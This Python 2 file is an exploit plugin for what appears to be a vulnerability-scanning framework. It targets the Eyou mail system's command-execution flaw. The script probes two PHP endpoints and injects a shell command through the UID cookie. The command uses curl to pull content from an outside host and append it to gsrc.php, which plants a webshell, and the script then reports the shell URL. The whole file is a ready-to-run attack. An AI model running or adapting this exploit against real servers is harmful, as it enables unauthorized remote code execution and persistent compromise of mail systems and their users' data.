#coding=utf-8
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
from libs.functions import *
#import modules.*


class hunter_exploit:
    '''discuz'''
    infos = {
        'plugin_name':'亿邮邮件系统命令执行可GetShell两处',
        'author':'demon',
        'update':'2015/10/16',
        'site':'http://www.dawner.info',
        'vuln_type':'cmd_exec',
        'vuln_source':'http://www.wooyun.org/bugs/wooyun-2014-070551'
        }
    opts  = {
        'url':'192.168.1.254 or default',
        }


    def __init__(self,url):
        self.url = url

    def exploit(self):
        '''start exploit'''
        touch_url_1 = self.url+'/user/autoComplete.php'
        touch_url_2 = self.url+'/user/storage_explore.php'
        try:
            code = urllib2.urlopen(touch_url_1).getcode()
            if code == 200:
                touch_url = touch_url_1
        except Exception,e:
            print str(e)
            print "[x]Open touch_url_1 error."

        try:
            code = urllib2.urlopen(touch_url_2).getcode()
            if code == 200:
                touch_url = touch_url_2
        except Exception,e:
            print str(e)
            print "[x]Open touch_url_2 error."
        
        shell_url = self.url+'/user/gsrc.php'
        cookie = "UID=1|curl http://www.test.com/test.txt>>gsrc.php"
        opener = urllib2.build_opener()
        opener.addheaders.append(('Cookie', cookie))
        try:
            f = opener.open(touch_url).read()
        except Exception,e:
            print e
            print "[x]Open the last touch_url error."
        c0de = urllib2.urlopen(shell_url).getcode()
        if c0de == 200:
            print '[!]Eyou with a cmd_exec at cookie.\n'
            print '[+]Shell_url:'+shell_url+'\n'
            return "[+]Shell:"+shell_url
        else:
            print "[!]Getshell failed!"
            pass


